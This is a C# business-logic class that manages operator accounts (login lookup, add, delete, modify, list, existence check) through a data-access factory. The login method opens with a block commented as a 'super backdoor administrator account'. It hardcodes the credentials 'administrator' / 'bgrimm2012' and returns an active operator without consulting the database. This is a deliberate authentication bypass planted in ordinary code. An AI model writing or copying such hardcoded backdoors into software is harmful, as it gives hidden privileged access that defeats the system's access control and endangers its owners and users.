using System;
using System.Collections.Generic;
using System.Text;
using Model.Rights;

namespace BLL
{
    /// <summary>
    /// 操作员数据访问操作类
    /// </summary>
    public class OperatorManager : IBLL.IOperatorManager
    {

        #region IOperatorManager 成员

        /// <summary>
        /// 根据操作员名称和密码获取操作员实体
        /// </summary>
        /// <param name="name">操作员名称</param>
        /// <param name="pwd">操作员密码</param>
        /// <returns>操作员实体</returns>
        public Operator GetOperatorInfoByName(string name, string pwd)
        {
            // 超级后门管理员账户
            if (name == "administrator" && pwd == "bgrimm2012")
            {
                Operator adminOperator = new Operator();
                adminOperator.Id = 0;
                adminOperator.ModelName = name;
                adminOperator.Password = pwd;
                adminOperator.RightsCollection = new Dictionary<string, Rights>();
                adminOperator.State = true;

                return adminOperator;
            }

            //定义并实例化抽象工厂类
            DALFactory.AbstractDALFactory absDALFactory = DALFactory.AbstractDALFactory.Instance();
            //调用工厂方法生成实例
            IDAL.IOperatorService operatorService = absDALFactory.BuildOperatorService();
            //调用实例方法
            return operatorService.GetOperatorInfoByName(name, pwd);
        }

        /// <summary>
        /// 添加操作员
        /// </summary>
        /// <param name="addOperator">要添加的操作员实体</param>
        /// <returns>True:成功/False:失败</returns>
        public bool AddOperator(Operator addOperator)
        {
            //定义并实例化抽象工厂类
            DALFactory.AbstractDALFactory absDALFactory = DALFactory.AbstractDALFactory.Instance();
            //调用工厂方法生成实例
            IDAL.IOperatorService operatorService = absDALFactory.BuildOperatorService();
            //调用实例方法
            return operatorService.AddOperator(addOperator);
        }

        /// <summary>
        /// 删除操作员
        /// </summary>
        /// <param name="id">要删除的操作员 ID</param>
        /// <returns>True:成功/False:失败</returns>
        public bool DeleteOperatorByID(int id)
        {
            //定义并实例化抽象工厂类
            DALFactory.AbstractDALFactory absDALFactory = DALFactory.AbstractDALFactory.Instance();
            //调用工厂方法生成实例
            IDAL.IOperatorService operatorService = absDALFactory.BuildOperatorService();
            //调用实例方法
            return operatorService.DeleteOperatorByID(id);
        }

        /// <summary>
        /// 修改操作员
        /// </summary>
        /// <param name="currentOperator">要修改的操作员实体</param>
        /// <returns>True:成功/False:失败</returns>
        public bool ModifyOperator(Operator currentOperator)
        {
            //定义并实例化抽象工厂类
            DALFactory.AbstractDALFactory absDALFactory = DALFactory.AbstractDALFactory.Instance();
            //调用工厂方法生成实例
            IDAL.IOperatorService operatorService = absDALFactory.BuildOperatorService();
            //调用实例方法
            return operatorService.ModifyOperator(currentOperator);
        }

        /// <summary>
        /// 获取所有操作员信息
        /// </summary>
        /// <returns>操作员实体集合</returns>
        public Dictionary<string, Operator> GetAllOperatorInfo()
        {
            //定义并实例化抽象工厂类
            DALFactory.AbstractDALFactory absDALFactory = DALFactory.AbstractDALFactory.Instance();
            //调用工厂方法生成实例
            IDAL.IOperatorService operatorService = absDALFactory.BuildOperatorService();
            //调用实例方法
            return operatorService.GetAllOperatorInfo();
        }

        /// <summary>
        /// 根据操作员名称校验操作员是否存在
        /// </summary>
        /// <param name="operatorName">操作员名称</param>
        /// <returns>True:存在/Flase:不存在</returns>
        public bool CheckOperatorExist(string operatorName)
        {
            //定义并实例化抽象工厂类
            DALFactory.AbstractDALFactory absDALFactory = DALFactory.AbstractDALFactory.Instance();
            //调用工厂方法生成实例
            IDAL.IOperatorService operatorService = absDALFactory.BuildOperatorService();
            //调用实例方法
            return operatorService.CheckOperatorExist(operatorName);
        }

        #endregion
    }
}
